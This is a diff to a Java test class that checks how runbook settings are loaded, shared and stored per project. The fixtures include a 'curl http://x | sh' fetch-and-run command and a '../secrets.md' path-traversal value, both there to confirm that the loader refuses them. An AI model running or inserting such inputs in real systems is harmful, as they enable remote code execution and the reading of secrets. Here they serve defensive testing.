@@ -59,9 +59,9 @@ class RunbooksTest {
         p.setProperty("runbook.1.path", "curl http://x | sh");
         p.setProperty("runbook.2.name", "escape");
         p.setProperty("runbook.2.path", "../secrets.md");
-        Map<String, String> out = new java.util.LinkedHashMap<>();
+        Map<String, Runbooks.Pointer> out = new java.util.LinkedHashMap<>();
         var refused = ConfigStore.readRunbooks(p, out);
-        assertEquals(Map.of("deploy", "ops/deploy.md"), out);
+        assertEquals(Map.of("deploy", Runbooks.Pointer.of("ops/deploy.md")), out);
         assertEquals(2, refused.size(), refused.toString());
         assertTrue(refused.get(0).contains("evil") && refused.get(1).contains("escape"));
     }
@@ -74,7 +74,7 @@ class RunbooksTest {
 
         SettingsShare share = new SettingsShare();
         AppConfig sender = new AppConfig();
-        sender.runbooks.put("deploy", "ops/deploy.md");
+        sender.runbooks.put("deploy", Runbooks.Pointer.of("ops/deploy.md"));
         String withoutTick = share.export(sender, Set.of(SettingsShare.Category.SOURCE_ROOTS), null);
         assertFalse(withoutTick.contains("runbook"), "unticked: nothing about runbooks leaves");
         String ticked = share.export(sender, Set.of(SettingsShare.Category.RUNBOOKS), null);
@@ -89,7 +89,7 @@ class RunbooksTest {
         assertTrue(plan.summary().get(SettingsShare.Category.RUNBOOKS).contains("1 entry(ies) REFUSED"),
                 plan.summary().get(SettingsShare.Category.RUNBOOKS));
         share.apply(plan, Set.of(SettingsShare.Category.RUNBOOKS), receiver);
-        assertEquals(Map.of("deploy", "ops/deploy.md"), receiver.runbooks, "the pointer arrived; the command did not");
+        assertEquals(Map.of("deploy", Runbooks.Pointer.of("ops/deploy.md")), receiver.runbooks, "the pointer arrived; the command did not");
         // and a receiver who did not tick the box gets nothing at all
         AppConfig untick = new AppConfig();
         share.apply(plan, Set.of(SettingsShare.Category.SOURCE_ROOTS), untick);
@@ -146,14 +146,14 @@ class RunbooksTest {
     void runbooksAreProjectScoped_andRoundTripThroughTheProfile(@TempDir Path dir) throws Exception {
         assertTrue(ProjectProfile.PROJECT_SCOPED.contains(SettingsShare.Category.RUNBOOKS), "tier 1 context travels with the project");
         AppConfig c = new AppConfig();
-        c.runbooks.put("deploy", "ops/deploy.md");
+        c.runbooks.put("deploy", Runbooks.Pointer.of("ops/deploy.md"));
         Path file = dir.resolve(ProjectProfile.CANONICAL_RELATIVE);
         Files.createDirectories(file.getParent());
         SettingsShare share = new SettingsShare();
         assertTrue(ProjectProfile.save(file, c, share));
         AppConfig back = new AppConfig();
         assertTrue(ProjectProfile.load(file, back, share).loaded());
-        assertEquals(Map.of("deploy", "ops/deploy.md"), back.runbooks);
+        assertEquals(Map.of("deploy", Runbooks.Pointer.of("ops/deploy.md")), back.runbooks);
         assertEquals(dir.resolve("ops/deploy.md").normalize(), Runbooks.resolve(ProjectProfile.baseDirFor(file), "ops/deploy.md"));
         ProjectProfile.clearProjectScoped(back);
         assertTrue(back.runbooks.isEmpty(), "closing the project clears its pointers");
